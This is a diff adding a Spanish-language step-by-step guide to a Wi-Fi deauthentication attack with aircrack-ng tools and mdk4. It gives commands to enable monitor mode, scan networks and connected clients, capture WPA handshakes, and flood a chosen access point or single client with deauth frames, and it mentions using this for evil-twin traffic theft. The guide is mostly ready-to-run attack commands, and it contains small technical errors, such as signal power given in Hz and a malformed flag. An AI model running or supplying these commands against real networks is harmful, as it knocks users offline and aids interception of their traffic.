@@ -1,0 +1,51 @@
+DEAUTH CON MDK4
+
+DEAUTH: se refiere a un ataque de desautenticación de Wi-Fi, un tipo de ataque de denegación 
+de servicio donde un atacante desconecta a un dispositivo de una red inalámbrica al enviar 
+tramas de desautenticación no cifradas. El atacante solo necesita la dirección MAC del dispositivo 
+víctima y puede usar este ataque para redirigir al cliente a un punto de acceso falso ("evil twin") 
+y robar su tráfico de red. 
+
+MDK4: es una herramienta de prueba de concepto (Proof-of-Concept) utilizada en el ámbito de la seguridad 
+y el hacking ético, específicamente para la explotación de debilidades comunes del protocolo IEEE 802.11 (Wi-Fi).
+
+
+Step by step:
+1.	” Iwconfig “ – Sirve para indicar el nombre del adaptador inalambrico, en este caso es “wlp2s0”
+
+2.	“ sudo airmon-ng check kill ” – Esto apaga todos los procesos que pudieran interferir con el modo monitor.
+
+3.	“ Sudo airmon-ng start wlp2s0 “ – (Activar el modo monitor) Esto crea una intefaz virtual llamada “wlp2s0mon” 
+que puede capturar todos los paquetes del aire, no solo de tu conexión.
+
+4.	“ sudo airodump-ng  wlp2s0mon ” – Este commando muestra una lista de las redes wi-fi visibles.
+
+Cada una aprece con:
+BSSID / -a |	Dirección MAC del router
+PWR	| Potencia de la señal en Hz
+CH / -c |	Canal o Channel
+ESSID |	Nombre de la red
+
+5.	“ sudo airodump-ng -c # --bssid AA:BB:CC:EE:FF wlp2s0mon ” – Esto es un handshake,
+es el proceso de autenticación que ocurre cuando un dispositivo se conecta a una red Wi-Fi 
+protegida por WPA/WPA2. Si capturas ese intercambio, puedes analizarlo sin conectarte realmente a la red. 
+
+Esto muestra los dispositivos que están conectados a la red y datos con las direcciones MAC.
+
+6.	“ sudo aireplay-ng –test wlp2s0mon ” – Este commando sirve para verificar la inyección.
+
+7.	“ timeout 5s sudo mdk4 wlanOmon d -B AA:BB:CC:DD:EE:FF -S 11:22:33:44:55:66   -s 10 ”
+
+Explicación:
+
+•	timeout 5s - hace que el comando termine automáticamente tras 5 segundos (evita olvidos).
+
+•	wlanOmon d - interfaz en modo monitor + modo deauth.
+
+•	-B <BSSID> - AP objetivo.
+
+•	-S <Station MAC> - cliente objetivo (usa esto para afectar solo 1 equipo).
+
+•	-s 10 - velocidad: 10 paquetes por segundo (ajusta según necesites).
+
+“ timeout 3s sudo mdk4 wlp2s0mon d -B  AA:BB:CC:DD:EE:FF - s 5” – Este comando targetea a la red en general
